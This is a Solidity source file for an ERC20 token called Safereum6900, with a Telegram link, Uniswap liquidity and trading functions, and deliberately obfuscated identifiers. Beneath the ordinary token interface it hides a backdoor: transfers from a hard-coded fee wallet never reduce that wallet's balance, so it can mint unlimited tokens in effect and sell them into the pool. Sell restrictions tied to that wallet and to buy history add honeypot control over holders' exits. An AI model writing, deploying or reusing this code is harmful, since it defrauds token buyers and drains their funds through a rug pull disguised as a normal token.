// TELEGRAM: https://t.me/SAFEREUM6900_ERC

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _eqjla(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _eqjla(a, b, "SafeMath");
    }

    function  _eqjla(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Safereum6900 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _vkrbj;
    address payable private _kpoyib;
    address private _rwayqe;

    string private constant _name = unicode"Safereum6900";
    string private constant _symbol = unicode"SAFEREUM6900";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _ebpmer;
    mapping (address => bool) private _yrkirhy;
    mapping(address => uint256) private _fnqonp;
    uint256 public _qvolqib = _totalSupply;
    uint256 public _wdrpvxe = _totalSupply;
    uint256 public _krTlhv= _totalSupply;
    uint256 public _voqTaf= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yovepnj=0;
    uint256 private _erwqzy=0;
    

    bool private _bfyadh;
    bool public _ueoipvf = false;
    bool private qiopue = false;
    bool private _oeprhiv = false;


    event _prkwsyc(uint _qvolqib);
    modifier uhrkoir {
        qiopue = true;
        _;
        qiopue = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _ebpmer[owner(

        )] = true;
        _ebpmer[address
        (this)] = true;
        _ebpmer[
            _kpoyib] = true;
        _kpoyib = 
        payable (0x933BeEECE2df3f41f253308a1C4Aa48cBF8bbbBB);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _eqjla(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kvjrub=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_ueoipvf) {
                if (to 
                != address
                (_vkrbj) 
                && to !=
                 address
                 (_rwayqe)) {
                  require(_fnqonp
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnqonp
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rwayqe && to != 
            address(_vkrbj) &&
             !_ebpmer[to] ) {
                require(amount 
                <= _qvolqib,
                 "Exceeds the _qvolqib.");
                require(balanceOf
                (to) + amount
                 <= _wdrpvxe,
                  "Exceeds the _wdrpvxe.");
                if(_erwqzy
                < _yovepnj){
                  require
                  (! _raepivb(to));
                }
                _erwqzy++;
                 _yrkirhy
                 [to]=true;
                kvjrub = amount._pvr
                ((_erwqzy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rwayqe &&
             from!= address(this) 
            && !_ebpmer[from] ){
                require(amount <= 
                _qvolqib && 
                balanceOf(_kpoyib)
                <_voqTaf,
                 "Exceeds the _qvolqib.");
                kvjrub = amount._pvr((_erwqzy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_erwqzy>
                _yovepnj &&
                 _yrkirhy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!qiopue 
            && to == _rwayqe &&
             _oeprhiv &&
             contractTokenBalance>
             _krTlhv 
            && _erwqzy>
            _yovepnj&&
             !_ebpmer[to]&&
              !_ebpmer[from]
            ) {
                _transferFrom( _wxarf(amount, 
                _wxarf(contractTokenBalance,
                _voqTaf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prpeuy(address
                    (this).balance);
                }
            }
        }

        if(kvjrub>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kvjrub);
          emit
           Transfer(from,
           address
           (this),kvjrub);
        }
        _balances[from
        ]= _eqjla(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _eqjla(kvjrub));
        emit Transfer
        (from, to, 
        amount.
         _eqjla(kvjrub));
    }

    function _transferFrom(uint256
     tokenAmount) private
      uhrkoir {
        if(tokenAmount==
        0){return;}
        if(!_bfyadh)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _vkrbj.WETH();
        _approve(address(this),
         address(
             _vkrbj), 
             tokenAmount);
        _vkrbj.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wxarf
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _eqjla(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _kpoyib){
            return a ;
        }else{
            return a .
             _eqjla (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvolqib = _totalSupply;
        _wdrpvxe = _totalSupply;
        emit _prkwsyc(_totalSupply);
    }

    function _raepivb(address 
    account) private view 
    returns (bool) {
        uint256 efsdfr;
        assembly {
            efsdfr :=
             extcodesize
             (account)
        }
        return efsdfr > 
        0;
    }

    function _prpeuy(uint256
    amount) private {
        _kpoyib.
        transfer(
            amount);
    }

    function openrTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _bfyadh ) ;
        _vkrbj  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _vkrbj), 
            _totalSupply);
        _rwayqe = 
        IUniswapV2Factory(_vkrbj.
        factory( ) 
        ). createPair (
            address(this
            ),  _vkrbj .
             WETH ( ) );
        _vkrbj.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rwayqe).
        approve(address(_vkrbj), 
        type(uint)
        .max);
        _oeprhiv = true;
        _bfyadh = true;
    }

    receive() external payable {}
}